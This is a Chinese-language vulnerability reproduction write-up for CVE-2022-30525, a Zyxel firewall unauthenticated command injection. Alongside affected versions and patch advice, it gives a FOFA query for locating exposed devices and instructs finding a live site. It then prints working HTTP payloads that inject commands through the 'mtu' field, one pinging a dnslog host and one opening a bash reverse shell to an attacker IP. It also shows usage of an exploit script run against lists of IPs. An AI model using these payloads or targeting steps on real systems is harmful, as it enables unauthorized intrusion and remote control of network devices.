# CVE-2022-30525
Zyxel 防火墙远程命令注入漏洞（CVE-2022-30525）

# 0x01 漏洞简介

2022 年 5 月 12 日，Zyxel（合勤）发布安全公告，修复了其防火墙设备中未经身份验证的远程命令注入漏洞（CVE-2022-30525）。

该漏洞存在于某些Zyxel防火墙版本的 CGI 程序中，允许在未经身份验证的情况下在受影响设备上以`nobody`用户身份执行任意命令。

目前该漏洞的细节已经公开披露，且相应的 Metasploit 模块已经发布，成功利用可以实现文件修改和操作系统命令执行，以获得对网络的初始访问权限并实现横向移动到内部系统。



# 0x02 漏洞影响

| **受影响的型号**               | **受影响的固件版本**          | **补丁版本** |
| ------------------------------ | ----------------------------- | ------------ |
| USG FLEX 100(W)、200、500、700 | ZLD V5.00 -ZLD V5.21 Patch 1  | ZLD V5.30    |
| USG FLEX 50(W) / USG20(W)-VPN  | ZLD V5.10 - ZLD V5.21 Patch 1 | ZLD V5.30    |
| ATP系列                        | ZLD V5.10 - ZLD V5.21 Patch 1 | ZLD V5.30    |
| VPN系列                        | ZLD V4.60 - ZLD V5.21 Patch 1 | ZLD V5.30    |

# 0x03 FOFA语法

```
 body="USG FLEX 100"
```


# 0x04 漏洞复现

找一个站点，确认ZYXEL防火墙特征。

![image](https://user-images.githubusercontent.com/84888757/172675012-f4a4efd0-7d7d-4f8f-991b-f9a164b40fec.png)


访问https://xx.xx.xx.xx/ztp/cgi-bin/handler，修改为`post`方式，加入payload

## 4.1 **漏洞验证**

```
POST /ztp/cgi-bin/handler HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Content-Type: application/json
Connection: close
Content-Length: 130
 
{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":"; ping ***.dnslog.cn;","data":"hi"}
```

## 4.2 **反弹shell**

```
{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":";bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 <&1';","data":"hi"}
```

## 4.3 利用工具

- 🔗 https://github.com/Henry4E36/CVE-2022-30525

用法

```
python3 CVE-2022-30525.py -u http://127.0.0.1

python3 CVE-2022-30525.py -f ip.txt
```


# 0x05 漏洞修复

厂商已发布补丁修复漏洞，用户请尽快更新至安全版本：ZLD V5.30。下载链接如下：
https://www.zyxel.com/support/download_landing.shtml

无法立即更新的用户，可以禁用对受影响产品的管理 Web 界面的 WAN 访问以缓解此漏洞。


# 0x06 参考

- https://www.rapid7.com/blog/post/2022/05/12/cve-2022-30525-fixed-zyxel-firewall-unauthenticated-remote-command-injection/

- https://www.henry4e36.top/index.php/archives/42.html
